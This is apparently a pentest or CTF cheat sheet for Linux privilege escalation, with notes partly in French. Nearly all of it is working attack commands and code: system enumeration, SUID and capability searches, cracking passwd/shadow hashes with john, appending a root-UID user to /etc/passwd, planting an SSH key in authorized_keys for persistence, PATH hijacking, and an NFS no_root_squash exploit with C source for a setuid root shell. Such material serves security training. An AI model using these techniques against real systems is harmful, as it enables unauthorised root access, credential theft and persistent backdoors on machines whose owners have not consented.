
[GTFOBins](https://gtfobins.github.io/)
[Exploit-DB](https://www.exploit-db.com/)
## Enumeration

```bash
hostname
uname -a
cat /proc/version
cat /etc/issue
ps aux # with grep
env
sudo -l # GTFOBins
/etc/passwd
history
find . -name *config*

ss -tulpn # explore sockets running
# look for firewall blocked sockets
```

## SUID

```bash
find / -type f -perm -04000 -ls 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

```bash
unshadow passwd.txt shadow.txt > forjohn.txt
john --wordlist=/usr/share/rockyou.txt forjohn.txt
```

```bash
# Ajouter un user 
pword=$(openssl passwd -1 -salt professional password)
# Ou alors run openssl tout seul pour avoir le password seul
echo "professional:$pword:0:0:root:/root:/bin/bash" >> /etc/passwd
```

## Capabilities

```bash
getcap -r / 2>/dev/null
```

## Cronjobs / Scheduled tasks

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

## SSH user

Créer une paire de clés avec `ssh-keygen -t rsa` 
```bash
# upload de clé publique
mkdir -p /home/user/.ssh; echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDv1F3Ub3titGmkF+4swGpplPEpMazt6cOe7M40V4Xjt+gz8s1Dbe8kt3dS9tYTkdZVVv9Jn0hT/NmisOnNx1B34s7R7FsLmCt9pqSZ0DR075VQNEBDHYFWzkiYgoFDF93Cxq5RG43SzBFZujCRCL+HssmLLioRqMRkrS1YUBcYAhpn+54kRYWdty5cBQYKiIyM+JWYtcwPL31iqTLzzvKhvE+BfdJCQ+uxiCZF3Dy+ke7VGYjYkQD4tj1QExSkr6PiMdWF619d+LBUiALJZyytQh3TTtVCcpw+a00PmK269tMOvrgckoiWfzoZsWNmEpsccZ8WY/NJg17A5f5NYv4Nrxa5eTBJI1r/IlNka/akm5gmiv26f4FGIVGMvAjkEJGOhEWwEdx1pCTze34EEqTw1i7oeF+8nmErn7G463E/Cp8/s/cargYAwouYIThisU6Q7PXJsWPhG9MpD3rowFWex0owp7NQyostcFtKDjDEcgVjH9v4ScIpU6zowoJq/0dsvMozzy6MEtnhekkYyC+VBflsJcIEQs3tVL12RkhbDVlmqFn9eiPNsBuScvqAudTmAS3no1cY3N/i003kmFaRzzZ6sIsWM1jvTep459v7Ro0sVuo+U1lbLzsk1XCIGnNKKgKEFmznaV9hktWSjIPxXabayqbdx6TNFW/VSa4j9Q==  > /home/user/.ssh/authorized_keys
```
Ensuite on peut se ssh avec `ssh -i id_rsa user@ip` 

## PATH

```bash
# find writable dirs
find / -writable 2>/dev/null | grep -v proc

# change path
export PATH="$PATH:/tmp" # malicious bash script in tmp with name 
# dont forget to chmod 777 the malicious script
```

## NFS

```bash
# list nfs exports
cat /etc/exports
showmount -e <myIP>
# look for no_root_squash on a writable share

# On attacker machine
mount -o rw <TARGET_IP>:<VULNERABLE_SHARE> /tmp/attackerfolder
```

Make a file and set uid and gid to root.

```c
#include<unistd.h>

int main(){
	setgid(0);
	setuid(0);
	system("/bin/bash");
	return 0;
}
```

Give SUID to the binary

```bash
gcc main.c -o main -w #no warnings
chmod +s main
```

On victim machine :
```bash
<VULNERABLE_SHARE>/main
```

